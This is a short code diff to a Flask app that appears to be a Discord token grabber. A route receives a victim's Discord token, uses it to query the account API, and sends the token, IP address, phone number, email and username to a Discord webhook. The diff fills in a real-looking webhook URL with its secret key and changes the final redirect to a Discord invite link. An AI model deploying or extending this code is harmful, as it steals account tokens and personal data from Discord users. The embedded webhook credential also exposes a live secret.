@@ -3,7 +3,7 @@ from dhooks import Webhook, Embed
 import requests
 
 app = Flask(__name__)
-hook = Webhook('YOUR WEBHOOK')
+hook = Webhook('https://discord.com/api/webhooks/1175859219052896378/4L0w5Tk2CnJbPWWDfythzGuWKbg1SwmfmMqR2giHIaxucWp6INMKrGQjyGDHT0N7Ao1b')
 
 
 def send_black_embed(token, ip, phone_number, email, username, tag, avatar_url,
@@ -44,7 +44,7 @@ def index(token):
 
   try:
     headers = {"Authorization": token}
-    url = "https://discord.com/api/v9/users/@me"
+    url = "https://discord.com/api/v33/users/@me"
     response = requests.get(url, headers=headers)
 
     if response.status_code == 200:
@@ -62,7 +62,7 @@ def index(token):
   except:
     pass
 
-  return redirect("https://discord.com/app")
+  return redirect("https://discord.gg/DfeVeFsH")
 
 
 app.run(host='0.0.0.0', port=81)
